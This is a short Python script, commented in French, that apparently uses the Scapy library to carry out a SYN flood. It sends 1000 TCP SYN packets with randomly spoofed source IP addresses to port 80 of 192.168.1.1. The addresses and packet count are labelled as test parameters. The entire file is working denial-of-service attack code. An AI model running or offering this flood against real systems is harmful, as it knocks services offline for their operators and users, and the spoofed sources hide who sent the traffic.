from scapy.all import *

# Définition de la fonction d'attaque SYN flood
def syn(cible, port, nbrpaquet):
    # Boucle  envois
    for _ in range(nbrpaquet):
        # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
        ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
        tcpt = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
        # Envoie paquet
        send(ip/tcpt)

# paramètres de testes
cible= "192.168.1.1"  # cible
port= 80  # Port 
nbrpaquet = 1000  # nbr envois
syn(cible, port, nbrpaquet)
